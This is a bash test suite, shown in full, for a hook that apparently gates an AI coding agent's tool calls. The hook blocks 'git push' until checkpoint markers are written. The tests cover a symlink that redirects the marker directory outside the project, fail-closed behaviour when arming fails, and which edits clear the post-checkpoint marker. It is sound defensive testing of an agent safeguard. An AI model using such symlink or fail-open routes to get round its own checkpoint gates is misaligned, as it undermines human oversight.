# Replace MARKER_DIR with a symlink to outside.
rm -rf "$MARKER_DIR"
ln -s "$I364_OUTSIDE_DIR/decoy-checkpoints" "$MARKER_DIR"
# Verify the symlink is set up correctly before exercising the gate.
if [ ! -L "$MARKER_DIR" ]; then
  echo "  ✗ I364-10 setup: .checkpoints/ should be a symlink before test"; ((failed++))
fi
# Trigger push self-arm with a fake HOME (no installed helper → bash fallback).
I364_FAKE_HOME4=$(mktemp -d)
I364_FAKE_HOME4="$(cd -P "$I364_FAKE_HOME4" && pwd)"
I364_PUSH_OUT3=$(echo "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$I364_SID9" \
  '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" \
  | HOME="$I364_FAKE_HOME4" bash "$HOOK" 2>/dev/null)
if echo "$I364_PUSH_OUT3" | grep -q '"decision".*"block"' \
   && echo "$I364_PUSH_OUT3" | grep -q "Post-implementation checkpoint required"; then
  echo "  ✓ I364-10a (codex R4 P1 repro, bash fallback): symlinked .checkpoints/ parent → push BLOCKED + self-heal"; ((passed++))
else
  echo "  ✗ I364-10a (codex R4 P1 repro, bash fallback): expected block, got: $I364_PUSH_OUT3"; ((failed++))
fi
# .checkpoints/ should now be a REAL directory (symlink replaced by mkdir
# after ensure_primary_dir's rm -f path).
if [ -L "$MARKER_DIR" ]; then
  echo "  ✗ I364-10b (codex R4 P1): .checkpoints/ parent symlink was NOT replaced (still a symlink)"; ((failed++))
elif [ -d "$MARKER_DIR" ]; then
  echo "  ✓ I364-10b (codex R4 P1): .checkpoints/ parent symlink replaced by real directory via ensure_primary_dir"; ((passed++))
else
  echo "  ✗ I364-10b (codex R4 P1): .checkpoints/ missing after self-heal"; ((failed++))
fi
# The marker MUST land at the canonical location, NOT in the outside dir.
if [ -f "$MARKER_DIR/.post-checkpoint-required.$I364_SID9" ] && [ ! -L "$MARKER_DIR/.post-checkpoint-required.$I364_SID9" ]; then
  echo "  ✓ I364-10c (codex R4 P1): POST_REQ marker landed under canonical .checkpoints/ (not the outside decoy)"; ((passed++))
else
  echo "  ✗ I364-10c (codex R4 P1): POST_REQ marker missing or symlinked"; ((failed++))
fi
# The outside decoy directory should NOT contain any new marker (proves
# the write did NOT follow the symlink-parent before self-heal).
if [ -e "$I364_OUTSIDE_DIR/decoy-checkpoints/.post-checkpoint-required.$I364_SID9" ]; then
  echo "  ✗ I364-10d (codex R4 P1): a marker leaked into the OUTSIDE decoy dir (symlink was followed)"; ((failed++))
else
  echo "  ✓ I364-10d (codex R4 P1): no marker leaked outside the project (symlink unlinked before mkdir/touch)"; ((passed++))
fi
rm -rf "$I364_OUTSIDE_DIR" "$I364_FAKE_HOME4"

# I364-11 (codex R4 P1, helper path): same parent-symlink scenario, now
# with checkpoint-marker.mjs installed in fake HOME. Exercises the
# Node-side ensurePrimaryDir self-heal (lstat → unlink → mkdir).
reset_state
I364_SID10="b00b1364-bbbb-4bbb-8bbb-b00b1364bbbb"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
mkdir -p "$I364_OUTSIDE_DIR/decoy-checkpoints"
rm -rf "$MARKER_DIR"
ln -s "$I364_OUTSIDE_DIR/decoy-checkpoints" "$MARKER_DIR"
I364_FAKE_HOME5=$(mktemp -d)
I364_FAKE_HOME5="$(cd -P "$I364_FAKE_HOME5" && pwd)"
mkdir -p "$I364_FAKE_HOME5/.episodic-memory/scripts/lib"
cp "$REPO_ROOT/scripts/checkpoint-marker.mjs" "$I364_FAKE_HOME5/.episodic-memory/scripts/checkpoint-marker.mjs"
cp -R "$REPO_ROOT/scripts/lib/." "$I364_FAKE_HOME5/.episodic-memory/scripts/lib/"
I364_PUSH_OUT4=$(echo "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$I364_SID10" \
  '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" \
  | HOME="$I364_FAKE_HOME5" bash "$HOOK" 2>/dev/null)
if echo "$I364_PUSH_OUT4" | grep -q '"decision".*"block"' \
   && echo "$I364_PUSH_OUT4" | grep -q "Post-implementation checkpoint required"; then
  echo "  ✓ I364-11a (codex R4 P1 repro, helper path): symlinked .checkpoints/ parent → push BLOCKED + self-heal"; ((passed++))
else
  echo "  ✗ I364-11a (codex R4 P1 repro, helper path): expected block, got: $I364_PUSH_OUT4"; ((failed++))
fi
if [ -L "$MARKER_DIR" ]; then
  echo "  ✗ I364-11b (codex R4 P1, helper): .checkpoints/ parent symlink was NOT replaced"; ((failed++))
elif [ -d "$MARKER_DIR" ]; then
  echo "  ✓ I364-11b (codex R4 P1, helper): .checkpoints/ parent symlink replaced via ensurePrimaryDir"; ((passed++))
else
  echo "  ✗ I364-11b (codex R4 P1, helper): .checkpoints/ missing after self-heal"; ((failed++))
fi
if [ -e "$I364_OUTSIDE_DIR/decoy-checkpoints/.post-checkpoint-required.$I364_SID10" ]; then
  echo "  ✗ I364-11c (codex R4 P1, helper): marker leaked outside the project"; ((failed++))
else
  echo "  ✓ I364-11c (codex R4 P1, helper): no marker leaked outside the project"; ((passed++))
fi
rm -rf "$I364_OUTSIDE_DIR" "$I364_FAKE_HOME5"

# ============================================================================
echo ""
echo "--- POST-pair sticky across a delivery + per-delivery E2E backstop ---"
# ============================================================================
# Fix: the push sweep no longer clears the POST pair, so push -> gh pr create ->
# gh pr review in ONE delivery need the post-checkpoint only ONCE (see DL-EX-A.7).
# A NEW task re-requires it via two mechanisms: fix (B) clears POST_DONE when a
# fresh .checkpoint-required is armed, and EDIT 3 clears POST_DONE when new
# repo-source work follows a satisfied post within the same approved plan.

# PPS-1..5 (fix B): a NEW planned task clears the prior delivery's POST_DONE.
reset_state
PPS_SID="aaaa1111-2222-4333-8444-aaaa55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_SID"          # sticky from a prior delivery
echo "old e2e" > "$MARKER_DIR/.post-checkpoint-done.$PPS_SID"
seed_approval "$MARKER_DIR" "$PPS_SID"                          # NEW plan approved
assert_blocked "PPS-1. new task: first repo-source Edit arms CR + blocks (new plan)" \
  "$(jq -n --arg fp "$TEST_DIR/scripts/impl.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
assert_marker_exists "PPS-2. fresh .checkpoint-required.<sid> armed" \
  "$MARKER_DIR/.checkpoint-required.$PPS_SID"
assert_marker_absent "PPS-3. fix (B) cleared the stale .post-checkpoint-done.<sid> (new task needs fresh E2E)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_SID"
assert_marker_absent "PPS-4. arm consumed the approval token" \
  "$MARKER_DIR/.plan-approved.$PPS_SID"
assert_blocked "PPS-5. new task push BLOCKED — sticky POST_REQ + (B)-cleared POST_DONE" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$PPS_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Post-implementation checkpoint required"

# PPS-6..8 (fix B fail-closed): a FAILED arm must NOT clear POST_DONE.
reset_state
PPS_FAIL_HOME=$(mktemp -d)
mkdir -p "$PPS_FAIL_HOME/.episodic-memory/scripts"
printf '#!/usr/bin/env node\nprocess.exit(1)\n' > "$PPS_FAIL_HOME/.episodic-memory/scripts/checkpoint-marker.mjs"
PPS_FAIL_SID="bbbb1111-2222-4333-8444-bbbb55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_FAIL_SID"
echo "good e2e" > "$MARKER_DIR/.post-checkpoint-done.$PPS_FAIL_SID"
seed_approval "$MARKER_DIR" "$PPS_FAIL_SID"
PPS_FAIL_OUT=$(echo "$(jq -n --arg fp "$TEST_DIR/scripts/impl2.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_FAIL_SID" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | HOME="$PPS_FAIL_HOME" bash "$HOOK" 2>/dev/null)
if echo "$PPS_FAIL_OUT" | grep -q '"decision".*"block"'; then
  echo "  ✓ PPS-6. failed arm → Edit FAILS CLOSED (still blocked)"; ((passed++))
else
  echo "  ✗ PPS-6. failed arm → expected block, got: $PPS_FAIL_OUT"; ((failed++))
fi
assert_marker_absent "PPS-7. failed arm did NOT create .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$PPS_FAIL_SID"
assert_marker_exists "PPS-8. fix (B) did NOT clear POST_DONE when arm FAILED (fail-closed — no fail-open bypass)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_FAIL_SID"
rm -rf "$PPS_FAIL_HOME"

# PPS-9..12 (EDIT 3): new repo-source work after a satisfied post re-gates the push.
reset_state
PPS_E3_SID="cccc1111-2222-4333-8444-cccc55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_E3_SID"
echo "e2e done" > "$MARKER_DIR/.post-checkpoint-done.$PPS_E3_SID"
assert_allowed "PPS-9. new repo-source Edit after satisfied post — ALLOWED (no-plan gate-free)" \
  "$(jq -n --arg fp "$TEST_DIR/scripts/more.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_E3_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_absent "PPS-10. EDIT 3 cleared .post-checkpoint-done.<sid> on new repo-source work" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_E3_SID"
assert_marker_exists "PPS-11. EDIT 3 left .post-checkpoint-required.<sid> untouched" \
  "$MARKER_DIR/.post-checkpoint-required.$PPS_E3_SID"
assert_blocked "PPS-12. push after new work BLOCKED — per-delivery E2E backstop restored" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$PPS_E3_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Post-implementation checkpoint required"

# PPS-13..14 (EDIT 3 scope): an OFF-REPO write must NOT clear POST_DONE.
reset_state
PPS_OFF_SID="dddd1111-2222-4333-8444-dddd55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_OFF_SID"
echo "e2e done" > "$MARKER_DIR/.post-checkpoint-done.$PPS_OFF_SID"
assert_allowed "PPS-13. off-repo Edit after satisfied post — ALLOWED" \
  "$(jq -n --arg fp "$TEST_HOME/.claude/settings.json" --arg cwd "$TEST_DIR" --arg sid "$PPS_OFF_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "PPS-14. EDIT 3 did NOT clear POST_DONE on an OFF-REPO write (scoped to repo source)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_OFF_SID"

# PPS-15..16 (EDIT 3 vs marker write): writing the post-checkpoint must not self-clear.
reset_state
PPS_MW_SID="eeee1111-2222-4333-8444-eeee55556666"
echo "pre" > "$MARKER_DIR/.pre-checkpoint-done.$PPS_MW_SID"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_MW_SID"
echo "existing post" > "$MARKER_DIR/.post-checkpoint-done.$PPS_MW_SID"
assert_allowed "PPS-15. Write to .post-checkpoint-done marker — ALLOWED (marker write)" \
  "$(jq -n --arg fp "$MARKER_DIR/.post-checkpoint-done.$PPS_MW_SID" --arg cwd "$TEST_DIR" --arg sid "$PPS_MW_SID" \
    '{tool_name:"Write",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "PPS-16. the post-checkpoint marker write did NOT self-clear via EDIT 3 (exits at :1379)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_MW_SID"

# PPS-17 (cross-session scope of fix B): another session's suffixed POST_DONE survives this session's arm.
reset_state
PPS_XA="11110000-2222-4333-8444-aaaa00001111"
PPS_XB="22220000-2222-4333-8444-bbbb00002222"
echo "B satisfied" > "$MARKER_DIR/.post-checkpoint-done.$PPS_XB"   # concurrent session B's post-done
seed_approval "$MARKER_DIR" "$PPS_XA"
echo "$(jq -n --arg fp "$TEST_DIR/scripts/a.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_XA" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
assert_marker_exists "PPS-17. fix (B) own-session-scoped: session B's .post-checkpoint-done.<sidB> SURVIVED session A's arm" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_XB"

# PPS-18 (EDIT 3 scope — Bash exclusion): a Bash repo-source write must NOT clear
# POST_DONE. EDIT 3 is Edit/Write/MultiEdit/NotebookEdit only so git commit/push
# plumbing can never falsely clear it. The marker side-effect is the invariant
# whether the Bash is allowed through or held for classification. This is a
# regression guard against accidentally re-adding Bash to the EDIT 3 case (which
# would reintroduce the redundant-post-checkpoint friction this fix removes).
reset_state
PPS_BASH_SID="ffff1111-2222-4333-8444-ffff55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_BASH_SID"
echo "e2e done" > "$MARKER_DIR/.post-checkpoint-done.$PPS_BASH_SID"
echo "$(jq -n --arg cmd "echo x > $TEST_DIR/scripts/foo.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_BASH_SID" \
  '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
assert_marker_exists "PPS-18. Bash repo-source write did NOT clear POST_DONE (EDIT 3 excludes Bash)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_BASH_SID"

# PPS-19 (EDIT 3 scope — .review-store/ carve-out): a second-opinion review
# artifact write under .review-store/ is in-repo but NOT repo source, so
# _tool_call_targets_repo_source returns 1 and EDIT 3 must NOT clear POST_DONE.
reset_state
PPS_RS_SID="abcd1111-2222-4333-8444-abcd55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_RS_SID"
echo "e2e done" > "$MARKER_DIR/.post-checkpoint-done.$PPS_RS_SID"
assert_allowed "PPS-19a. Edit under .review-store/ after satisfied post — ALLOWED" \
  "$(jq -n --arg fp "$TEST_DIR/.review-store/my-review.md" --arg cwd "$TEST_DIR" --arg sid "$PPS_RS_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "PPS-19b. EDIT 3 did NOT clear POST_DONE on a .review-store/ write (in-repo, not source)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_RS_SID"

# PPS-20 (EDIT 3 AND-predicate): with POST_DONE present but POST_REQ absent, EDIT
# 3 must NOT clear — the backstop fires only inside an armed post-checkpoint
# (POST_REQ exists AND POST_DONE non-empty). Proves the conjunction, not a lone
# POST_DONE read.
reset_state
PPS_NOREQ_SID="99991111-2222-4333-8444-999955556666"
echo "stale" > "$MARKER_DIR/.post-checkpoint-done.$PPS_NOREQ_SID"   # POST_DONE present, POST_REQ absent
assert_allowed "PPS-20a. repo-source Edit with POST_DONE but no POST_REQ — ALLOWED" \
  "$(jq -n --arg fp "$TEST_DIR/scripts/x.mjs" --arg cwd "$TEST_DIR" --arg sid "$PPS_NOREQ_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "PPS-20b. EDIT 3 did NOT fire without POST_REQ armed (AND-predicate holds)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_NOREQ_SID"

# PPS-21 (EDIT 3 scope — .git/ carve-out): a write under .git/ (commit-msg/PR-body
# scratch, git internals) is NOT repo source, so EDIT 3 must NOT clear POST_DONE.
# Regression for the live-E2E miss: writing the PR body to .git/ cleared the
# satisfied post-checkpoint between the push and gh pr create.
reset_state
PPS_GIT_SID="cafe1111-2222-4333-8444-cafe55556666"
touch "$MARKER_DIR/.post-checkpoint-required.$PPS_GIT_SID"
echo "e2e done" > "$MARKER_DIR/.post-checkpoint-done.$PPS_GIT_SID"
assert_allowed "PPS-21a. Write under .git/ after satisfied post — ALLOWED" \
  "$(jq -n --arg fp "$TEST_DIR/.git/CKPT_PR_BODY.md" --arg cwd "$TEST_DIR" --arg sid "$PPS_GIT_SID" \
    '{tool_name:"Write",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "PPS-21b. EDIT 3 did NOT clear POST_DONE on a .git/ write (git internals, not source)" \
  "$MARKER_DIR/.post-checkpoint-done.$PPS_GIT_SID"

# PPS-22 (pre-gate — .git/ carve-out under an approved plan): a .git/ write must
# not arm the pre-checkpoint even with an approval token present (git internals
# are never implementation).
reset_state
PPS_GIT2_SID="beef1111-2222-4333-8444-beef55556666"
seed_approval "$MARKER_DIR" "$PPS_GIT2_SID"
assert_allowed "PPS-22a. Write under .git/ with approval token — ALLOWED (not implementation)" \
  "$(jq -n --arg fp "$TEST_DIR/.git/COMMIT_EDITMSG" --arg cwd "$TEST_DIR" --arg sid "$PPS_GIT2_SID" \
    '{tool_name:"Write",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"
assert_marker_absent "PPS-22b. .git/ write did NOT arm .checkpoint-required.<sid> (carve-out)" \
  "$MARKER_DIR/.checkpoint-required.$PPS_GIT2_SID"

echo ""
echo "Passed: $passed"
echo "Failed: $failed"

if [ $failed -gt 0 ]; then
  exit 1
fi
exit 0
